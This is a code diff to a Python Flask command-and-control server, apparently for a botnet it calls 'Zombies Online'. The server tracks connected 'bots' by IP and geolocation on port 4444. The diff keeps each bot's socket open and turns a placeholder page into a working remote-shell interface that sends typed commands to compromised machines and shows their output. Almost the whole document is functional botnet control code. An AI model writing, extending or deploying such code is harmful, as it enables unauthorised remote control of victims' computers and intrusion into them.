@@ -4,7 +4,7 @@ import pickle
 import time
 import platform
 import os
-from flask import Flask, render_template_string, request, redirect, url_for
+from flask import Flask, render_template_string, request, redirect, url_for, Response
 import geocoder
 
 app = Flask(__name__)
@@ -12,13 +12,13 @@ HOST = '0.0.0.0'
 SOCKET_PORT = 4444
 PICKLE_FILE = 'bots.pkl'
 bots = {}
+sessions = {}
 
-# HTML TEMPLATE (vše v jednom)
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html lang="en">
+<html lang=\"en\">
 <head>
-    <meta charset="UTF-8">
+    <meta charset=\"UTF-8\">
     <title>Zombies Online</title>
     <style>
         body { font-family: Arial, sans-serif; background: #111; color: #eee; padding: 20px; }
@@ -28,7 +28,11 @@ HTML_TEMPLATE = """
         .online { color: lime; }
         .offline { color: red; }
         a { color: deepskyblue; text-decoration: none; }
+        textarea { width: 100%; height: 200px; background: #222; color: #0f0; font-family: monospace; }
     </style>
+    <script>
+        setInterval(() => { fetch('/session').then(res => res.text()).then(html => document.body.innerHTML = html); }, 5000);
+    </script>
 </head>
 <body>
     <h1>Zombies Online: {{ online_count }}</h1>
@@ -49,6 +53,16 @@ HTML_TEMPLATE = """
     </table>
 </body>
 </html>
+"""
+
+SHELL_TEMPLATE = """
+<h2>Shell for Bot {{ bot_id }}</h2>
+<form method='post'>
+    <input type='text' name='cmd' style='width:90%;'>
+    <input type='submit' value='Execute'>
+</form>
+<textarea readonly>{{ output }}</textarea><br>
+<a href='/'>⬅ Back</a>
 """
 
 def save_bots():
@@ -74,7 +88,6 @@ def update_bot(ip, os_name):
             })
             save_bots()
             return bot_id
-    # New bot
     bot_id = str(len(bots) + 1)
     bots[bot_id] = {
         'ip': ip,
@@ -97,10 +110,10 @@ def socket_listener():
         try:
             os_name = conn.recv(1024).decode()
             bot_id = update_bot(ip, os_name)
+            sessions[bot_id] = conn
             print(f"[+] Bot {bot_id} ({ip}) connected")
         except:
-            pass
-        conn.close()
+            conn.close()
 
 def cleanup_loop():
     while True:
@@ -117,9 +130,20 @@ def dashboard():
     online_count = sum(1 for b in bots.values() if b['status'] == 'Online')
     return render_template_string(HTML_TEMPLATE, bots=bots, online_count=online_count)
 
-@app.route('/shell-id=<bot_id>')
+@app.route('/shell-id=<bot_id>', methods=['GET', 'POST'])
 def shell(bot_id):
-    return f"Reverse Shell for Bot {bot_id} – comming soon..."
+    output = ''
+    if request.method == 'POST':
+        cmd = request.form['cmd']
+        try:
+            conn = sessions.get(bot_id)
+            if conn:
+                conn.send(cmd.encode())
+                data = conn.recv(4096).decode()
+                output = data
+        except Exception as e:
+            output = f"Error: {e}"
+    return render_template_string(SHELL_TEMPLATE, bot_id=bot_id, output=output)
 
 @app.route('/session')
 def session():
